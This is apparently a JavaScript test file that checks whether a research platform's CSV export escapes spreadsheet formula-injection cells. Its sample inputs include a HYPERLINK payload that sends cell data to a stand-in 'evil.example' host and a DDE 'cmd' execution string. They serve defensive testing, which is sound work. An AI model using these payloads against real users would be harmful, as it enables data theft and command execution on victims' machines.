/* tests/admin-tools-csv-injection.test.js
 *
 * CSV formula-injection guard for the admin research exports (2026-07-22).
 *
 * admin-tools.js `_csvCell` escapes CSV correctly (quotes, CR/LF), but a cell
 * beginning with a spreadsheet formula trigger (= + - @ tab CR) can EXECUTE
 * when the facilitator opens the downloaded file in Excel/LibreOffice. Free-text
 * participant answers, hypotheses and display names flow into these cells, so a
 * participant could submit `=HYPERLINK(...)` / `=cmd|...` and target the
 * facilitator's machine. The fix prefixes such a cell with a single quote so
 * the app treats it as literal text (standard OWASP CSV-injection mitigation),
 * WITHOUT corrupting legitimate numeric columns (e.g. a negative normGain).
 *
 * `_csvCell` lives inside admin-tools.js's IIFE and isn't exported, so we lift
 * it (and its `_PLAIN_NUMBER` helper) out of the source and evaluate it in
 * isolation — it depends only on String + regex, no DOM/globals.
 */

const test = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");

const P = path.join(__dirname, "..", "docs", "Third_session", "PBL_platform");
const TOOLS = fs.readFileSync(path.join(P, "admin-tools.js"), "utf8");

/* Extract `const _PLAIN_NUMBER = …;` + `function _csvCell(…) {…}` (everything
   from the helper up to the next function) and compile it to a callable. */
function loadCsvCell() {
  const start = TOOLS.indexOf("const _PLAIN_NUMBER");
  const end = TOOLS.indexOf("function _toCSV");
  assert.ok(start >= 0 && end > start, "could not locate _csvCell in source");
  const src = TOOLS.slice(start, end);
  // eslint-disable-next-line no-new-func
  return new Function(src + "\n; return _csvCell;")();
}

const _csvCell = loadCsvCell();

test("formula-trigger cells get the neutralizing single-quote prefix", () => {
  // Each dangerous leading char must be defused: content is prefixed with ' so
  // Excel/LibreOffice treat it as text. Cells are also always CSV-quoted.
  assert.strictEqual(_csvCell("=1+1"), "\"'=1+1\"");
  assert.strictEqual(_csvCell("+x"), "\"'+x\"");
  assert.strictEqual(_csvCell("-x"), "\"'-x\"");
  assert.strictEqual(_csvCell("@x"), "\"'@x\"");
});

test("tab / CR leading triggers are also neutralized", () => {
  assert.strictEqual(_csvCell("\t=x"), "\"'\t=x\"");
  assert.strictEqual(_csvCell("\r=x"), "\"'\r=x\"");
});

test("a real exfiltration payload is neutralized, not executed", () => {
  const attack = '=HYPERLINK("http://evil.example/?"&A1,"click")';
  const out = _csvCell(attack);
  assert.ok(out.startsWith("\"'="), "payload must be prefixed so it can't run: " + out);
});

test("plain text is unchanged (no spurious prefix)", () => {
  assert.strictEqual(_csvCell("hello"), '"hello"');
  assert.strictEqual(_csvCell("P1"), '"P1"');
});

test("legitimate numbers survive — no prefix that would corrupt R/Excel parsing", () => {
  // normGain can be negative; a leading `-` on a plain number must NOT be
  // treated as a formula, or the numeric research column becomes text.
  assert.strictEqual(_csvCell(-0.25), '"-0.25"');
  assert.strictEqual(_csvCell("-0.25"), '"-0.25"');
  assert.strictEqual(_csvCell("-5"), '"-5"');
  assert.strictEqual(_csvCell("+3"), '"+3"');
  assert.strictEqual(_csvCell("-1.5e-3"), '"-1.5e-3"');
  assert.strictEqual(_csvCell(0), '"0"');
});

test("`-`-led text that is NOT a clean number is still neutralized", () => {
  // e.g. a DDE payload beginning with a digit-ish prefix.
  assert.ok(_csvCell("-2+3+cmd|' /C calc'!A1").startsWith("\"'-"),
    "a signed non-number must still be prefixed");
});

test("existing CSV escaping still holds (quotes doubled, CR/LF stripped)", () => {
  assert.strictEqual(_csvCell('a "b" c'), '"a ""b"" c"');
  assert.strictEqual(_csvCell("line1\nline2"), '"line1 line2"');
});

test("null / undefined stay empty (unquoted)", () => {
  assert.strictEqual(_csvCell(null), "");
  assert.strictEqual(_csvCell(undefined), "");
});

test("source: the guard and the number exemption are both present", () => {
  assert.match(TOOLS, /\/\^\[=\+\\-@\\t\\r\]\//,
    "the formula-trigger regex must be present in _csvCell");
  assert.match(TOOLS, /_PLAIN_NUMBER/, "the numeric-exemption helper must be present");
});

test("source: the email-roster export routes through _csvCell (not a local escaper)", () => {
  const fn = TOOLS.slice(TOOLS.indexOf("research_email_roster.csv") - 900,
    TOOLS.indexOf("research_email_roster.csv") + 40);
  assert.match(fn, /_csvCell\(e\.name\)/, "roster name cell must use _csvCell");
  assert.match(fn, /_csvCell\(e\.university\)/, "roster university cell must use _csvCell");
});
